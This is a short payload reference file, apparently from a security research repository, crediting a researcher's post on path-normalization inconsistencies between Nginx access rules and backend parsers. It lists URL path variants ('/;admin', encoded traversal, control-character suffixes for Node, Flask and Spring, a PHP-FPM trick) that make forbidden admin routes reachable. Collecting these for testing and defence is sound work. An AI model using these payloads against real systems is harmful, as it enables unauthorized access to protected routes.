# Payloads — path-normalization

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. Nginx ACL vs backend parser inconsistencies — forbidden routes become accessible
- Researcher: @0xacb
- Post: https://x.com/0xacb/status/1940325041834471716
- Sources: `posts/0xacb/ARCHIVE.md`, `data/x_posts.jsonl`

```
/;admin ; /admin%2f..%2f ; /admin\xa0 (Node) ; /admin\x85 (Flask) ; /admin; or /admin\x09 (Spring) ; /admin.php/index.php (PHP-FPM)
```
